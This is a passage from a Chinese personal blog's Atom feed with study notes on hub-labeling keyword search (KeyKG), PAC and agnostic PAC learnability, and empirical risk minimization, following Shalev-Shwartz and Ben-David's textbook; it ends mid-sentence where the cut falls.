<span class="math inline">\(U_B=\{B,E,C\}\)</span> （这与算法 KeyKG 得到的结果是一致的）</li></ul></li><li>令 <span class="math inline">\(F\in K_1\)</span> 为 <span class="math inline">\(v_1\)</span> ，查询其 Static HL，得到 <span class="math inline">\(L(F) = \{A,B,F\}\)</span> ；<ul><li>因为 <span class="math inline">\(M_{1,A} = M_{1,B} = E, M_{1,F} = \textrm{null}\)</span> ，所以令 <span class="math inline">\(E\in K_2\)</span> 为 <span class="math inline">\(v_2\)</span> ；</li><li>因为 <span class="math inline">\(M_{2,A} = C, M_{2,B} = M_{2,F} = \textrm{null}\)</span> ，所以令 <span class="math inline">\(C\in K_3\)</span> 为 <span class="math inline">\(v_3\)</span> ；</li><li>这样就形成了 <span class="math inline">\(U_F=\{F,E,C\}\)</span> （这与算法 KeyKG 得到的结果是一致的）</li></ul></li></ul><div class="note default"><p><strong>TODO</strong>：另一半的例子怎么解释？？？</p></div><h1 id="how-much">How much？</h1><ul><li>基于 <em>betweenness centrality</em> 的启发式方法构建的 <em>Static Hub Labelings</em> 超越了现存的方案。</li><li><em>Dynamic Hub Labelings</em> 则通过倒排并聚集查询相关的静态标签，加速了总体的查询效率。</li></ul><h1 id="what-then">What Then？</h1><ul><li>寻找支持更高效地边删除（<em>edge deletion</em>）的解决方案</li><li>KeyKG+ 的近似比率可以进一步得到提高</li><li>现存 HL 方案无法处理巨大而稠密的图。</li></ul><h1 id="problems-to-solve">Problems to Solve</h1><ul><li><input type="checkbox" disabled="" />Hub Labeling<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></li><li><input type="checkbox" disabled="" />pruned landmark labeling <a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></li><li><input type="checkbox" disabled="" />PLL<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></li><li><input type="checkbox" disabled="" />between centrality？？？【10】 <a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a> vs 【4】<a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a></li></ul><section class="footnotes" role="doc-endnotes"><hr /><ol><li id="fn1" role="doc-endnote"><p>Ittai Abraham, Daniel Delling, Andrew V. Goldberg, and Renato Fonseca F. Werneck. 2011. A Hub-Based Labeling Algorithm for Shortest Paths in Road Networks. In SEA. 230–241.<a href="#fnref1" class="footnote-back" role="doc-backlink">↩</a></p></li><li id="fn2" role="doc-endnote"><p>Takuya Akiba, Yoichi Iwata, and Yuichi Yoshida. 2013. Fast exact shortest-path distance queries on large networks by pruned landmark labeling. In SIGMOD. 349–360<a href="#fnref2" class="footnote-back" role="doc-backlink">↩</a></p></li><li id="fn3" role="doc-endnote"><p>Takuya Akiba, Yoichi Iwata, and Yuichi Yoshida. 2013. Fast exact shortest-path distance queries on large networks by pruned landmark labeling. In SIGMOD. 349–360<a href="#fnref3" class="footnote-back" role="doc-backlink">↩</a></p></li><li id="fn4" role="doc-endnote"><p>Ulrik Brandes. 2001. A faster algorithm for betweenness centrality. J. Math. Soc. 25, 2 (2001), 163–177.<a href="#fnref4" class="footnote-back" role="doc-backlink">↩</a></p></li><li id="fn5" role="doc-endnote"><p>Ziyad AlGhamdi, Fuad Jamour, Spiros Skiadopoulos, and Panos Kalnis. 2017. A Benchmark for Betweenness Centrality Approximation Algorithms on Large Graphs. In SSDBM<a href="#fnref5" class="footnote-back" role="doc-backlink">↩</a></p></li></ol></section>]]></content>
        <author>
            <name><![CDATA[CosmosNing的个人博客]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/09/19/pac-learning-and-its-variants/</id>
        <title><![CDATA[PAC 模型及其变体]]></title>
        <updated>2021-05-14T12:17:25+08:00</updated>
        <link href="https://cosmosning.github.io/2020/09/19/pac-learning-and-its-variants/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/09/19/pac-learning-and-its-variants/"><![CDATA[<blockquote><p>本文将介绍通用的学习模型 PAC 及其变体形式。</p><ul><li><p>最原始的 PAC 主要需要满足<strong>可实现假设</strong>，<strong>训练样本量要大于样本复杂度函数</strong>。</p></li><li><p>现实情况中，<strong>可实现假设难以满足</strong>（先验知识不一定猜得准），因此<strong>将目标标记函数改为数据-标签分布，并从中采样训练样本</strong>，就可以类似的得到 Agnostic PAC 。</p></li><li><p>原始的 PAC 中，标记函数将学习问题限制在二元分类任务中。为了获得更加通用的学习模型，我们定义更加一般的损失函数。通过损失函数，可计算真实误差和经验风险：</p></li></ul><blockquote><ul><li><p>在<strong>问题分布</strong>（<span class="math inline">\(\mathcal{D}\)</span>）上采样得到的误差函数的<strong>期望</strong>，作为<strong>真实误差</strong>；</p></li><li><p>在<strong>训练样本</strong>（<span class="math inline">\(S\)</span>）上采样得到的误差函数的<strong>平均值</strong>，作为<strong>经验风险</strong>；</p></li></ul></blockquote></blockquote><h1 id="pac-learning">PAC Learning</h1><p>在<a href="/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/">上一篇文章</a>中，我们证明了对于一个有限的假设集，<mark>如果拥有足量的训练样本（这些训练样本是从同一分布中独立采样，并被同一标记函数标记而生成的），ERM 会输出近似正确的假设</mark>。更一般的，我们定义 <em>Probably Approximately Correct Learning</em> （PAC）如下：</p><div class="note primary"><p><strong>Def. PAC Learnability</strong></p><p>如果</p><ul><li>存在一个函数 <span class="math inline">\(m_{\mathcal{H}}:(0,1)^2\rightarrow \mathbb{N}\)</span> ，</li><li>并且存在一个学习算法满足以下条件：<ul><li>对于任意的 <span class="math inline">\(\epsilon, \delta\in(0,1)\)</span> ，任意的 <span class="math inline">\(\mathcal{X}\)</span> 上的分布 <span class="math inline">\(\mathcal{D}\)</span> ，任意的标记函数 <span class="math inline">\(f: \mathcal{X}\rightarrow \lbrace 0,1\rbrace\)</span> ，如果对于 <span class="math inline">\(\mathcal{H,D},f\)</span> 可实现假设（<em>realizability assumption</em> ，即 <span class="math inline">\(\exists\ h^\star\in \mathcal{H}, L_{D,f}(h^\star) = 0\)</span>）成立，那么当学习算法的训练样本量 <span class="math inline">\(m \ge m_{\mathcal{H}}(\epsilon, \delta)\)</span> 时（这些训练样本是由从 <span class="math inline">\(\mathcal{D}\)</span> 中独立采样，并被 <span class="math inline">\(f\)</span> 标记而生成的），学习算法会以至少 <span class="math inline">\(1 - \delta\)</span> 的概率返回一个假设 <span class="math inline">\(h\)</span>，并且该假设满足 <span class="math inline">\(L_{(\mathcal{D},f)}(h) \le \epsilon\)</span></li></ul></li></ul><p>则一个假设类 <span class="math inline">\(\mathcal{H}\)</span> 是 PAC 可学习的</p></div><div class="note info"><p><strong>有关 PAC Learnability 的补充说明</strong></p><ul><li><span class="math inline">\(\epsilon\)</span> 称作<strong>精度参数</strong>（<em>accuracy parameter</em>），代表输出分类器与最优之间的误差大小（对应 PAC 中的 <strong><em>approximately correct</em></strong>）。这意味着，<span class="math inline">\(\epsilon\)</span> 允许学习算法犯一些小错误。</li><li><span class="math inline">\(\delta\)</span> 称作<strong>置信参数</strong>（<em>confidence parameter</em>），代表输出分类器满足上述精度要求的可能性（对应 PAC 中的 <strong><em>probably</em></strong>）</li><li><span class="math inline">\(m_{\mathcal{H}}:(0, 1) \rightarrow \mathbb{N}\)</span> 称作<strong>样本复杂度</strong>（<em>sample complexity</em>）函数，表示<strong>需要多少训练样本数据，才能够保证获得一个尽可能近似正确的答案</strong>。该函数依赖于 <span class="math inline">\(\epsilon, \delta,\mathcal{H}\)</span> 。依据 PAC Learnability 的定义，存在不止一个 <span class="math inline">\(m_{\mathcal{H}}\)</span> 满足条件。通常，我们定义 <span class="math inline">\(m_{\mathcal{H}}\)</span> 为满足条件的<strong>最小整数</strong>。</li></ul></div><p>对上一篇文章中获得的结论，我们换一种表达，则有下面的推论</p><div class="note default"><p><strong>PAC 可学习的样本复杂度条件</strong></p><p>每一个有限假设类都是 PAC 可学习的，只要它的样本复杂度满足： <span class="math display">\[m_{\mathcal{H}} \le \lceil \frac{log(\frac{\mathcal{H}}{\delta})}{\epsilon} \rceil\]</span></p></div><h1 id="a-more-general-learning-model">A More General Learning Model</h1><p>对于大多数任务，可实现假设很难得到满足，而且上述定义只适用于二元分类问题，因此通用性不佳。为了得到更加通用的学习模型，我们对上述模型从以下两个方面进行拓展：</p><ol type="1"><li>去除可实现假设。引入 <strong>Agnostic PAC</strong> 解决这个问题。</li><li>学习比二元分类问题更加广泛的任务。通过对<strong>损失函数的一般化</strong>来支持这种拓展。</li></ol><h2 id="releasing-the-realizablity-assumption-agnostic-pac-learning">Releasing the Realizablity Assumption —— Agnostic PAC Learning</h2><h3 id="a-more-realistic-model-for-the-data-generating-distribution">A More Realistic Model for the Data-Generating Distribution</h3><p>简单来说，我们可以将 “目标标记函数” 替换为<strong>数据-标签</strong>生成分布。</p><p>规范地，设 <span class="math inline">\(\mathcal{D}\)</span> 为 <span class="math inline">\(\mathcal{X} \times \mathcal{Y}\)</span> 上的概率分布，其中 <span class="math inline">\(\mathcal{X}\)</span> 为领域集，<span class="math inline">\(\mathcal{Y}\)</span> 为标签集。也就是说，<span class="math inline">\(\mathcal{D}\)</span> 为在领域点和标签上的联合分布。我们可以将 <span class="math inline">\(\mathcal{D}\)</span> 看作由两个部分组成：一个在未被标记的领域点上的分布 <span class="math inline">\(\mathcal{D}_x\)</span> （有时候，也称作<strong>边缘分布</strong>） ，另一个为每一个领域点的标签上的<strong>条件概率</strong> <span class="math inline">\(\mathcal{D}((x,y)|x)\)</span> 。</p><div class="note info"><p><strong>如何理解条件概率？</strong></p><ul><li>很多事情无法精确刻画，因此可用一个条件分布来描述。随着某一变量的变化，对应事件的概率也会发生变化。例如，<span class="math inline">\(\mathcal{D}(y|x)\)</span> 事件 <span class="math inline">\(y\)</span> 的概率会随着 <span class="math inline">\(x\)</span> 的变化而变化；此外，在 <span class="math inline">\(\mathcal{D}(y|x)\)</span> 中，<span class="math inline">\(\mathcal{D}(y|x)\)</span> 是关于 <span class="math inline">\(y\)</span> 的函数，而 <span class="math inline">\(x\)</span> 是作为函数的参数（如果要确定关于 <span class="math inline">\(y\)</span> 的函数关系，<span class="math inline">\(x\)</span> 要事先指定）。</li></ul></div><h3 id="the-empirical-and-true-error-revised">The Empirical and True Error Revised</h3><p>与分布的改变相对应，我们定义预测规则 <span class="math inline">\(h\)</span> <strong>真实误差</strong>（或者叫做<strong>风险</strong>）如下： <span class="math display">\[L_{\mathcal{D}}\overset{def}{=}\underset{(x,y)\sim \mathcal{D}}{\mathbb{P}}[h(x)\ne y] \overset{def}{=}\mathcal{D}(\lbrace (x,y): h(x) \ne y \rbrace) \tag{3.1}\]</span> 而经验风险并没有改变，依然是： <span class="math display">\[L_{S}(h)\overset{def}{=}\frac{|\lbrace i\in[m] : h(x_i) \ne y_i \rbrace|}{m}\]</span></p><h3 id="the-goal">The Goal</h3><p>学习算法的目标是寻找一些假设，<span class="math inline">\(h:\mathcal{X}\rightarrow \mathcal{Y}\)</span> ，尽可能近似最小化真实风险，<span class="math inline">\(L_{\mathcal{D}}(h)\)</span></p><h3 id="the-bayes-optimal-predictor">The Bayes Optimal Predictor</h3><p>给定任意的在 <span class="math inline">\(\mathcal{X} \times \lbrace 0,1\rbrace\)</span> 上的概率分布，从 <span class="math inline">\(\mathcal{X}\)</span> 到 <span class="math inline">\(\lbrace 0, 1 \rbrace\)</span> 的最佳标记函数为 <span class="math display">\[f_{\mathcal{D}}(x) = \begin{cases} 1 &amp;if\ \mathbb{P}[y=1|x]\ge \frac{1}{2}\\ 0 &amp; otherwise\end{cases}\]</span> 这也就是说，对于任意的二元分类器 <span class="math inline">\(g: \mathcal{X}\rightarrow \lbrace 0, 1\rbrace\)</span>，<span class="math inline">\(L_{\mathcal{D}}(f_{\mathcal{D}}) \le L_{\mathcal{D}}(g)\)</span></p><div class="note info"><p><strong>证明 The Bayes Optimal Predictor</strong>（TODO）</p></div><p>一旦我们对数据生成分布不做任何预先假设，那么将没有算法将保证找到一个预测器，媲美 Bayes Optimal Predictor 的效果。因此，我们需要学习算法找到一个预测器，在给定某些假设类的基准测试时，<strong>它的误差并不会比可能的最佳的预测器的误差大太多</strong>。因此，我们有如下的 <strong>Agnostic PAC Learnability</strong>：</p><div class="note primary"><p><strong>Def. Agnostic PAC Learnability</strong></p><p>如果</p><ul><li><p>存在一个函数 <span class="math inline">\(m_{\mathcal{H}}:(0,1)^2\rightarrow \mathbb{N}\)</span> ，</p></li><li><p>并且存在一个学习算法满足以下条件：</p><ul><li>对于任意的 <span class="math inline">\(\epsilon, \delta\in(0,1)\)</span> ，任意的 <span class="math inline">\(\mathcal{X} \times\mathcal{Y}\)</span> 上的分布 <span class="math inline">\(\mathcal{D}\)</span> ，当学习算法的训练样本量 <span class="math inline">\(m \ge m_{\mathcal{H}}(\epsilon, \delta)\)</span> 时（这些训练样本是由从 <span class="math inline">\(\mathcal{D}\)</span> 中独立采样而生成的），学习算法会以至少 <span class="math inline">\(1 - \delta\)</span> 的概率返回一个假设 <span class="math inline">\(h\)</span>，并且该假设满足： <span class="math display">\[L_{\mathcal{D}}(h) \le \underset{h&#39;\in\mathcal{H}}{min}L_D(h&#39;) + \epsilon\]</span></li></ul></li></ul><p>则一个假设类 <span class="math inline">\(\mathcal{H}\)</span> 是 Agnostic PAC 可学习的</p></div><h2 id="generalized-loss-function-agnostic-pac-learning-for-general-loss-function">Generalized Loss Function —— Agnostic PAC Learning for General Loss Function</h2><p>为了适应不同的任务，我们接下来定义通用的损失函数。</p><p>给定任意的集合 <span class="math inline">\(\mathcal{H}\)</span> 和领域集 <span class="math inline">\(Z\)</span> ，设 <span class="math inline">\(l\)</span> 为任意 <span class="math inline">\(\mathcal{H}\times Z\)</span> 到非负实数的函数， <span class="math inline">\(l: \mathcal{H} \times Z \rightarrow \mathbb{R}_+\)</span> ，我们称 <span class="math inline">\(l\)</span> 为<strong>损失函数</strong>。</p><p>下面用分类器误差的期望来定义<strong>风险函数</strong>。</p><p>给定一个 <span class="math inline">\(h\in \mathcal{H}\)</span> ，关于在 <span class="math inline">\(Z\)</span> 上的概率分布 <span class="math inline">\(\mathcal{D}\)</span> ，对应的风险函数为： <span class="math display">\[L_{\mathcal{D}}(h)\overset{def}{=}\underset{z\sim \mathcal{D}}{\mathbb{E}}[l(h,z)]\tag{3.3}\]</span> 相似的，经验风险函数为对采样样本 <span class="math inline">\(S=(z_1,\dots,z_m)\in Z^m\)</span> 上的损失的期望： <span class="math display">\[L_S(h)\overset{def}{=}\frac{1}{m}\sum_{i=1}^{m}l(h,z_i)\tag{3.4}\]</span> 综上所述，有如下更加通用的 Agnostic PAC 的定义：</p><div class="note primary"><p><strong>Def. Agnostic PAC Learning for General Loss Function</strong></p><p>如果</p><ul><li><p>存在一个函数 <span class="math inline">\(m_{\mathcal{H}}:(0,1)^2\rightarrow \mathbb{N}\)</span> ，</p></li><li><p>并且存在一个学习算法满足以下条件：</p><ul><li>对于任意的 <span class="math inline">\(\epsilon, \delta\in(0,1)\)</span> ，任意的 <span class="math inline">\(Z\)</span> 上的分布 <span class="math inline">\(\mathcal{D}\)</span> ，当学习算法的训练样本量 <span class="math inline">\(m \ge m_{\mathcal{H}}(\epsilon, \delta)\)</span> 时（这些训练样本是由从 <span class="math inline">\(\mathcal{D}\)</span> 中独立采样而生成的），学习算法会以至少 <span class="math inline">\(1 - \delta\)</span> 的概率返回一个假设 <span class="math inline">\(h\in \mathcal{H}\)</span>，并且该假设满足 <span class="math display">\[L_{\mathcal{D}}(h) \le \underset{h&#39;\in\mathcal{H}}{min}L_{\mathcal{D}}(h&#39;)+ \epsilon\]</span> 其中 <span class="math inline">\(L_{\mathcal{D}}(h) = \mathbb{E}_{z\sim D}[l(h, z)]\)</span></li></ul></li></ul><p>则一个假设类 <span class="math inline">\(\mathcal{H}\)</span> 关于一个集合 <span class="math inline">\(Z\)</span> 和 损失函数 <span class="math inline">\(l:\mathcal{H}\times Z\rightarrow \mathbb{R}_+\)</span> 是 Agnostic PAC 可学习的</p></div><h1 id="reference">Reference</h1><p>Shai Shalev-Shwartz, Shai Ben-David. <a href="https://www.cs.huji.ac.il/~shais/UnderstandingMachineLearning/index.html" target="_blank" rel="noopener">Understanding Machine Learning: From Theory to Algorithms</a></p>]]></content>
        <author>
            <name><![CDATA[CosmosNing的个人博客]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/</id>
        <title><![CDATA[统计学习框架及经验风险最小化]]></title>
        <updated>2021-05-14T12:17:25+08:00</updated>
        <link href="https://cosmosning.github.io/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/"><![CDATA[<blockquote><p>本文主要介绍两个内容：</p><ol type="1"><li><strong>统计学习框架</strong>。这是一个十分通用的框架，指明了学习的<strong>输入</strong>、<strong>输出</strong>和<strong>学习目标</strong>。</li><li><strong>经验风险最小化</strong>（<strong>ERM</strong>）的学习方法。引入<strong>经验风险</strong>，从而可以<strong>从训练数据中管中窥豹</strong>，归纳出一般规律。但是 ERM <strong>会产生过拟合</strong>现象。一种常见的解决方案是<strong>引入归纳偏好</strong>（或者是先验知识）。具体来说，确定一个有<strong>限的假设类</strong>集合，供学习算法学习。这样是否是有效的？通过证明发现，<strong>只要有足够的训练样本，就可以达到比较好的效果</strong>。</li></ol></blockquote><h1 id="a-formal-model-the-statistical-learning-framework">A Formal Model —— The Statistical Learning Framework</h1><h2 id="the-learners-input">The Learner's Input</h2><ul><li><strong>领域集（<em>Domain set</em>）</strong>：这是我们<strong>希望标记的事物的集合</strong>，记作 <span class="math inline">\(\mathcal{X}\)</span> 。通常情况下，人们会用一个特性向量（vector of <em>features</em>）表示这些领域点（<em>domain points</em>）。</li></ul><div class="note info"><ul><li>领域集（<em>domain set</em>）又称作实例空间（<em>instance space</em>）</li><li>领域点（<em>domain points</em>）又称作实例（<em>instances</em>）</li></ul></div><ul><li><strong>标签集（<em>Label set</em>）</strong>：这是<strong>可能的标签的集合</strong>，记作 <span class="math inline">\(\mathcal{Y}\)</span> 。</li><li><strong>训练数据（<em>Training data</em>）</strong>：这是一系列已经被标记的领域点，常常表示为 <span class="math inline">\(S=((x_1,\ y_1)\dots(x_m,\ y_m))\)</span> （这是在 <span class="math inline">\(\mathcal{X}\times \mathcal{Y}\)</span> 中的<strong>有限</strong>的数对序列）</li></ul><div class="note info"><ul><li>训练数据（<em>training data</em>）又称作 <strong><em>training examples</em></strong>，或者 <strong><em>training set</em></strong></li></ul></div><h2 id="the-learners-output">The Learner's Output</h2><p>人们希望学习器输出一个<strong>预测规则</strong>（<em>prediction rule</em>）：<span class="math inline">\(h:\mathcal{X} \rightarrow \mathcal{Y}\)</span> 。这个函数又称作为<strong>预测器</strong>（<em>predictor</em>）、<strong>假设</strong>（<em>hypothesis</em>）或者是<strong>分类器</strong>（<em>classifier</em>）。此外，我们记一个学习算法 <span class="math inline">\(A\)</span> ，接受训练数据 <span class="math inline">\(S\)</span> 为输入，返回对应假设为 <span class="math inline">\(A(S)\)</span> 。</p><h2 id="a-simple-data-generation-model">A Simple Data-generation Model</h2><p>训练数据是如何生成的？这里给出两个假设。</p><ul><li>假设所有的实例都由一个概率分布生成，记这个在 <span class="math inline">\(\mathcal{X}\)</span> 上的概率分布为 <span class="math inline">\(\mathcal{D}\)</span> 。</li><li>假设存在一个“完全正确”的标记函数 <span class="math inline">\(f:\mathcal{X}\rightarrow \mathcal{Y}\)</span> ，显然，对于任意的 <span class="math inline">\(i\)</span> ，有 <span class="math inline">\(y_i=f(x_i)\)</span></li></ul><p>总的来说，在训练数据中的每一个数对，都由以下方式生成：</p><ol type="1"><li>先从概率分布 <span class="math inline">\(\mathcal{D}\)</span> 采样得到一个点 <span class="math inline">\(x_i\)</span> ；</li><li>再利用标记函数 <span class="math inline">\(f\)</span> 为 <span class="math inline">\(x_i\)</span> 打上标签。</li></ol><h2 id="measures-of-success">Measures of Success</h2><p>如何衡量算法学习是否成功？这里可以定义一个<strong>分类器的误差</strong>（<em>error of a classifier</em>），即学习算法没有正确预测随机数据（这些随机数据，是由前面提到的对于学习算法隐含的概率分布所生成的）的标签的概率。也就是说，<span class="math inline">\(h\)</span> 的误差是<strong>从分布 <span class="math inline">\(\mathcal{D}\)</span> 随机中取出一个 <span class="math inline">\(x\)</span> ，而 <span class="math inline">\(h(x)\)</span> 不等于 <span class="math inline">\(f(x)\)</span> 的概率</strong>。</p><p>规范的来讲，给定一个领域子集（<em>domain subset</em>），<span class="math inline">\(A\subset \mathcal{X}\)</span> ，概率分布 <span class="math inline">\(\mathcal{D}\)</span> ，定义一个数 <span class="math inline">\(\mathcal{D}(A)\)</span> ，其中 <span class="math inline">\(\mathcal{D}(A)\)</span> 表示学习算法在 <span class="math inline">\(\mathcal{D}\)</span> 中观察到一个点 <span class="math inline">\(x\in A\)</span> 的可能性。我们定义预测规则（<em>prediction rule</em>）的误差如下： <span class="math display">\[L_{\mathcal{D},f}(h)\overset{def}{=}\underset{x\sim\mathcal{D}}{\mathbb{P}}[h(x)\ne f(x)]\overset{def}{=}\mathcal{D}(\lbrace x:h(x)\ne f(x)\rbrace)\tag{2.1}\]</span> <div class="note info"><p><strong>有关 <span class="math inline">\(A\)</span> 与 <span class="math inline">\(\mathcal{D}(A)\)</span> 的补充说明</strong></p><ul><li>在许多情况下，我们将 <span class="math inline">\(A\)</span> 称作一个事件（<em>event</em>）</li><li>二元分类问题中，我们定义 <span class="math inline">\(A\)</span> 为 <span class="math inline">\(\pi :\mathcal{X}\rightarrow \lbrace0,1\rbrace\)</span> ，也就有 <span class="math inline">\(A = \lbrace x\in\mathcal{X}: \pi(x) = 1\rbrace\)</span> 。在这种情况下，我们也使用 <span class="math inline">\(\mathbb{P}_{x\sim \mathcal{D}}[\pi(x)]\)</span> 来表达 <span class="math inline">\(\mathcal{D}(A)\)</span> 。</li></ul></div></p><div class="note info"><p><strong><span class="math inline">\(L_{\mathcal{D},f}\)</span> 的别称</strong></p><p><span class="math inline">\(L_{\mathcal{D},f}\)</span> 又称作<strong>泛化误差</strong>（<strong><em>generalization error</em></strong>），<strong>风险</strong>（<strong><em>risk</em></strong>），<strong><span class="math inline">\(h\)</span> 的真正误差</strong>（<strong><em>true error</em> of h</strong>）</p></div><h2 id="a-note-about-the-information-available-to-the-learner">A Note about The Information Available to The Learner</h2><p>要注意的是，<strong>学习器本身并不知晓隐含的概率分布 <span class="math inline">\(\mathcal{D}\)</span> 和 “完全正确” 的标记函数 <span class="math inline">\(f\)</span></strong> 。因此，学习器只能通过观察训练数据集，和环境交互，才能发现规律。</p><div class="note info"><h2 id="summary">Summary</h2><ul><li><strong>学习算法的输入和输出</strong>：一个学习算法接受一个<strong>训练集</strong> <span class="math inline">\(S\)</span> 作为<strong>输入</strong>，并且<strong>输出</strong>一个<strong>预测器</strong>（<em>predictor</em>） <span class="math inline">\(h_S: \mathcal{X} \rightarrow \mathcal{Y}\)</span> 。其中，训练集 <span class="math inline">\(S\)</span> 通过以下过程生成：首先从一个未知分布 <span class="math inline">\(D\)</span> 中采样，然后使用目标函数（<em>target function</em>） <span class="math inline">\(f\)</span> 标记。此外，预测器 <span class="math inline">\(h_S\)</span> 的下标 <span class="math inline">\(S\)</span> 强调了输出的 <span class="math inline">\(h_S\)</span> 是依赖于 <span class="math inline">\(S\)</span> 的。</li><li><strong>学习算法的目标</strong>：学习算法的目标是找到一个 <span class="math inline">\(h_S\)</span> ，关于未知分布 <span class="math inline">\(\mathcal{D}\)</span> 和标记函数 <span class="math inline">\(f\)</span> ，它能最小化误差。</li></ul></div><h1 id="empirical-risk-minimization-erm">Empirical Risk Minimization （ERM）</h1><h2 id="empirical-error">Empirical Error</h2><p>由于学习器并不知道 <span class="math inline">\(\mathcal{D}\)</span> 和 <span class="math inline">\(f\)</span> ，因此，式（2.1）无法直接计算。学习器能够计算的是<strong>训练误差</strong>（<em>training error</em>），即分类器在训练数据上产生的误差，其定义如下： <span class="math display">\[L_S(h)\overset{def}{=}\frac{|\lbrace i\in[m]:h(x_i)\ne y_i \rbrace|}{m}\tag{2.2}\]</span></p><p>其中 <span class="math inline">\([m]=\lbrace 1,\dots ,m\rbrace\)</span> 。</p><div class="note info"><p><strong>训练误差</strong>（<em>training error</em>）有时又称作<strong>经验误差</strong>（<strong><em>empirical error</em></strong>）或者<strong>经验风险</strong>（<strong><em>empirical risk</em></strong>）</p></div><h2 id="erm">ERM</h2><p>既然学习算法能够从训练数据中获取关于这个世界的简要情况，所以寻找一个在训练数据上效果良好的答案是说得通的。<strong>寻找一个最小化 <span class="math inline">\(L_S(h)\)</span> 的 <span class="math inline">\(h\)</span></strong> 的学习范式称作经验风险最小化（<strong>Empirical Risk Minimization</strong>），简称 <strong>ERM</strong></p><h2 id="the-problem-of-erm-overfitting">The problem of ERM —— Overfitting</h2><p>然而，ERM 可能会产生一种错误——过拟合。下面用一个例子说明。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/09/example-of-overfitting.PNG" alt="过拟合的例子. Source:《Understanding Machine Learning: From Theory to Algorithms》" /><figcaption>过拟合的例子. Source:《Understanding Machine Learning: From Theory to Algorithms》</figcaption></figure><p>假设概率分布 <span class="math inline">\(\mathcal{D}\)</span> 是灰色正方形框中的均匀分布，如果实例落在蓝色实例所在的黑色正方形框中，标记函数 <span class="math inline">\(f\)</span> 将其标记为 1，否则标记为 0。考虑如下的预测器：</p><p><span class="math display">\[h_S(x)= \begin{cases}y_i\quad &amp;if\ \exists i\in[m]\ s.t. x_i=x;\\0\quad &amp;ohterwise. \end{cases}\]</span></p><p>因为 <span class="math inline">\(h_S\)</span> 在训练数据上，对实例标签的预测全部正确，所以 <span class="math inline">\(L_S(h_s) = 0\)</span> 。根据经验风险最小化的原则，式子 （2.3）会被 ERM 选中（因为没有比 0 更小的训练损失）。然而如果取训练数据以外的一个点 <span class="math inline">\(x&#39;\)</span>，并且这个点在黑色正方形框中，那么根据式（2.3），<span class="math inline">\(h_S(x&#39;) = 0\)</span> 。而实际上 <span class="math inline">\(f(x&#39;) = 1\)</span>，这就会产生错误。</p><p>这种现象称作<strong>“过拟合”</strong>（<em>overfitting</em>）。直观的来说，当学习算法找到的假设<strong>太符合</strong>训练数据时，就会发生过拟合。</p><h2 id="empirical-risk-minimization-with-inductive-bias">Empirical Risk Minimization with Inductive Bias</h2><h3 id="applying-erm-over-a-restricted-search-space">Applying ERM over a Restricted Search Space</h3><p>一种常见的解决 ERM 过拟合的方法是<strong>限制 ERM 的搜索空间</strong>。规范的讲，在见到数据之前，学习器应该事先挑选出一个预测器集合。这个预测器集合又称作<strong>“假设类”</strong>（<em>hypothesis class</em>），记作 <span class="math inline">\(\mathcal{H}\)</span> 。每一个 <span class="math inline">\(h\in \mathcal{H}\)</span> 是一个 <span class="math inline">\(\mathcal{X}\rightarrow \mathcal{Y}\)</span> 的函数。<strong>给定一个假设类 <span class="math inline">\(\mathcal{H}\)</span> ，一个训练集 <span class="math inline">\(\mathcal{S}\)</span> ，<span class="math inline">\(ERM_{\mathcal{H}}\)</span> 学习器使用 ERM 规则来选取一个在 <span class="math inline">\(\mathcal{S}\)</span> 上有最小可能误差的 <span class="math inline">\(h\)</span> ，其中 <span class="math inline">\(h\in \mathcal{H}\)</span></strong> 。规范地，我们有如下公式： <span class="math display">\[ERM_{\mathcal{H}}(S)\in \underset{h\in \mathcal{H}}{argmin}(L_S(h))\]</span> 其中，<span class="math inline">\(argmin\)</span> 表示在 <span class="math inline">\(\mathcal{H}\)</span> 中使得 <span class="math inline">\(L_S(h)\)</span> 最小的假设集合（<span class="math inline">\(h\in\mathcal{H}\)</span>）。通过限制学习器从 <span class="math inline">\(\mathcal{H}\)</span> 中选取预测器，学习器会偏向我们所特定的预测器集合。这种限制常常被称为<strong>归纳偏好</strong>（<em>inductive bias</em>）。由于这种限制的选择在学习器看到数据之前就确定了，因此在理想情况下，它应该基于一些有关所学问题的先验知识（<em>prior knowledge</em>）。</p><p>直观地，<strong>选择一个首先更多的假设类会更好地防止过拟合的发生，但是与此同时，这可能会导致一个更强的归纳偏好</strong>。</p><h3 id="finite-hypothesis-classes">Finite Hypothesis Classes</h3><p>对类的最简单的限制是设置一个其大小的上界（也就是，限制 <span class="math inline">\(\mathcal{H}\)</span> 中预测器 <span class="math inline">\(h\)</span> 的个数）。对应的，我们有如下结论：</p><ul><li><strong>只要有足够数量的训练样本，如果 <span class="math inline">\(\mathcal{H}\)</span> 是一个有限的类（<em>finite class</em>），那么 <span class="math inline">\(ERM_{\mathcal{H}}\)</span> 将不会产生过拟合。</strong></li></ul><p>那么至少需要多少训练样本呢？下面我们讨论这个问题</p><p>在此之前，我们先引入两个假设：</p><ol type="1"><li><strong>可实现假设</strong>（<strong><em>The Realizability Assumption</em></strong>）：<span class="math inline">\(\exists h^\star \in \mathcal{H},\ L_{(\mathcal{D},f)}(h^\star) = 0\)</span> 。</li><li><strong>独立同分布假设</strong>（<strong><em>The i.i.d. Assumption</em></strong>）：训练数据中每一个样本都关于分布 <span class="math inline">\(\mathcal{D}\)</span> <strong>独立同分布</strong>（<strong>independently and identically distributed</strong>，short for <strong>i.i.d.</strong>），记作 <span class="math inline">\(S\sim D^m\)</span> 。其中， <span class="math inline">\(m\)</span> 是 <span class="math inline">\(S\)</span> 的大小，<span class="math inline">\(D^m\)</span> 表示了根据 <span class="math inline">\(\mathcal{D}\)</span> 采样 <span class="math inline">\(m\)</span> 个元素，构成 <span class="math inline">\(m\)</span> 